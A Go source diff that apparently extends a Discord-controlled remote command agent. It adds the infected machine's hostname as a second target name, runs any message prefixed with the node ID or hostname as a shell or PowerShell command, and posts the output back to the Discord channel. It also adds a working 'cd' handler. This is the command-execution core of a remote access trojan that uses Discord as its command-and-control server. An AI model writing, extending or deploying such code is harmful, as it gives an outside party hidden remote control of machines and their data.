@@ -22,11 +22,15 @@ import (
 var p = fmt.Println
 
 var ID = "" // ID used for telling machines apart. Will be based on MAC address
+var name = "HOSTNAME PLACEHOLDER"
 
 func main() {
 
 	// Generating the node's unique ID
 	ID = generateGUID()
+
+	// Setting the users hostname
+	name, _ = os.Hostname()
 
 	// Where to download files to
 
@@ -90,8 +94,23 @@ func messageHandler(s *discordgo.Session, m *discordgo.MessageCreate) {
 		s.ChannelMessageSend(m.ChannelID, "```"+string(out)+"```")
 	}
 
+	// Running commands that are sent via ID
 	if strings.HasPrefix(m.Content, ID+": ") {
 		command_string := m.Content[len(ID+": "):len(m.Content)]
+		p(command_string)
+
+		out, errorMessage := runCommand(command_string)
+		if errorMessage != "" {
+			p(errorMessage)
+			s.ChannelMessageSend(m.ChannelID, "```"+errorMessage+"```")
+			return
+		}
+		s.ChannelMessageSend(m.ChannelID, "```"+string(out)+"```")
+	}
+
+	// Running commands that are sent via hostname
+	if strings.HasPrefix(m.Content, name+": ") {
+		command_string := m.Content[len(name+": "):len(m.Content)]
 		p(command_string)
 
 		out, errorMessage := runCommand(command_string)
@@ -150,6 +169,28 @@ func runCommand(command string) (outString string, errorMessage string) {
 		shell = "powershell.exe"
 	} else {
 		shell = "sh"
+	}
+
+	// Change directory
+	if strings.HasPrefix(command, "cd ") {
+
+		dir := command[3:] // get the first three chars
+
+		os.Chdir(dir)
+
+		p(dir)
+
+		// run command, and if it causes an error create an error
+		out, err := exec.Command(shell, "-c", "pwd").Output()
+		if err != nil {
+			p(err.Error())
+			errorMessage = err.Error()
+
+			return
+		}
+
+		outString = string(out)
+		return
 	}
 
 	// run command, and if it causes an error create an error
